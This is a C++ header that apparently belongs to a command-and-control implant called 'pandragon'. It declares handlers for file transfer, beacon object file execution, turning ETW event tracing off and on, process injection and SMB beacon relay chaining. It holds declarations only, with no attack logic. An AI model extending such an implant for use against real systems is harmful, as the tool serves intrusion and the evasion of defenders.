#pragma once

#include <cstdint>
#include <cstddef>
#include "config_parser.h"
#include "resolver.h"
#include "pandragon_runtime.h"


/* ============================================================================
 * Command Handlers Namespace
 *
 * These functions are registered with CommandDispatcher and called
 * through the handler registration system.
 * ============================================================================ */

namespace pandragon::handlers {

// File Download Handlers
[[nodiscard]] bool handleFileDownloadStart(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleFileDownloadChunk(const uint8_t* args, size_t args_len);

// File Upload Handlers
[[nodiscard]] bool handleFileUploadStart(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleFileUploadChunk(const uint8_t* args, size_t args_len);

// Command Handlers
[[nodiscard]] bool handleEcho(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleSleep(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleBofExec(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleBofFree(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleLongRunningBof(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleFileDownload(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleFileUpload(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleRotateKey(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleEtwEnable(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleEtwDisable(const uint8_t* args, size_t args_len);

// Process Injection
[[nodiscard]] bool handleInjectProcess(const uint8_t* args, size_t args_len);

// P2P Relay (SMB Beacon Chaining)
[[nodiscard]] bool handleStartRelay(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleStopRelay(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleRelayAddChild(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleRelayRemoveChild(const uint8_t* args, size_t args_len);
[[nodiscard]] bool handleRelayDown(const uint8_t* args, size_t args_len);

// Kill
[[nodiscard]] bool handleExit(const uint8_t* args, size_t args_len);

} // namespace pandragon::handlers
